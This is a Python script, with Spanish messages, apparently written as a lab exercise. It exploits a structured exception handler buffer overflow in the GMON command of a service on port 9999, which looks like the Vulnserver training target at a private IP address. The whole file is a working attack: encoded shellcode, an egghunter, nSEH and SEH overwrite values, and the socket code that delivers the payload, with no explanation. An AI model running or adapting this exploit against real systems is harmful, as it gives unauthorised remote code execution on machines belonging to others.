#!/usr/bin/python

import socket, sys
from struct import pack

def explotacion():
    shellcode=("\xdd\xc7\xd9\x74\x24\xf4\xb8\x25\xe2\x23\x7f\x5d\x2b\xc9\xb1"
                "\x52\x83\xc5\x04\x31\x45\x13\x03\x60\xf1\xc1\x8a\x96\x1d\x87"
                "\x75\x66\xde\xe8\xfc\x83\xef\x28\x9a\xc0\x40\x99\xe8\x84\x6c"
                "\x52\xbc\x3c\xe6\x16\x69\x33\x4f\x9c\x4f\x7a\x50\x8d\xac\x1d"
                "\xd2\xcc\xe0\xfd\xeb\x1e\xf5\xfc\x2c\x42\xf4\xac\xe5\x08\xab"
                "\x40\x81\x45\x70\xeb\xd9\x48\xf0\x08\xa9\x6b\xd1\x9f\xa1\x35"
                "\xf1\x1e\x65\x4e\xb8\x38\x6a\x6b\x72\xb3\x58\x07\x85\x15\x91"
                "\xe8\x2a\x58\x1d\x1b\x32\x9d\x9a\xc4\x41\xd7\xd8\x79\x52\x2c"
                "\xa2\xa5\xd7\xb6\x04\x2d\x4f\x12\xb4\xe2\x16\xd1\xba\x4f\x5c"
                "\xbd\xde\x4e\xb1\xb6\xdb\xdb\x34\x18\x6a\x9f\x12\xbc\x36\x7b"
                "\x3a\xe5\x92\x2a\x43\xf5\x7c\x92\xe1\x7e\x90\xc7\x9b\xdd\xfd"
                "\x24\x96\xdd\xfd\x22\xa1\xae\xcf\xed\x19\x38\x7c\x65\x84\xbf"
                "\x83\x5c\x70\x2f\x7a\x5f\x81\x66\xb9\x0b\xd1\x10\x68\x34\xba"
                "\xe0\x95\xe1\x6d\xb0\x39\x5a\xce\x60\xfa\x0a\xa6\x6a\xf5\x75"
                "\xd6\x95\xdf\x1d\x7d\x6c\x88\xe1\x2a\x1e\xe0\x8a\x28\xde\xe1"
                "\x8b\xa4\x38\x6b\x1c\xe1\x93\x04\x85\xa8\x6f\xb4\x4a\x67\x0a"
                "\xf6\xc1\x84\xeb\xb9\x21\xe0\xff\x2e\xc2\xbf\x5d\xf8\xdd\x15"
                "\xc9\x66\x4f\xf2\x09\xe0\x6c\xad\x5e\xa5\x43\xa4\x0a\x5b\xfd"
                "\x1e\x28\xa6\x9b\x59\xe8\x7d\x58\x67\xf1\xf0\xe4\x43\xe1\xcc"
                "\xe5\xcf\x55\x81\xb3\x99\x03\x67\x6a\x68\xfd\x31\xc1\x22\x69"
                "\xc7\x29\xf5\xef\xc8\x67\x83\x0f\x78\xde\xd2\x30\xb5\xb6\xd2"
                "\x49\xab\x26\x1c\x80\x6f\x56\x57\x88\xc6\xff\x3e\x59\x5b\x62"
                "\xc1\xb4\x98\x9b\x42\x3c\x61\x58\x5a\x35\x64\x24\xdc\xa6\x14"
                "\x35\x89\xc8\x8b\x36\x98")
    
    egghunter=("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
                "\xef\xb8\x48\x41\x43\x4b\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
    
    egg="HACKHACK"
    nSEH="\xeb\x06\x90\x90"
    SEH=pack("<L",0x625010b4)
    offset=3515
    buffer="A"*(offset-len(egg+shellcode))
    buffer+=egg
    buffer+=shellcode
    buffer+=nSEH
    buffer+=SEH
    buffer+="\x90"*10
    buffer+=egghunter
    buffer+="D"*(4300-len(buffer))
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.112.138',9999))
        s.send('GMON /.:/' + buffer)
        data = s.recv(1024)
        s.close()
    except:
        print("\n[!] Ha ocurrido un error en la conexion\n")
        sys.exit(1)
    
        
    
if __name__=="__main__":
    explotacion()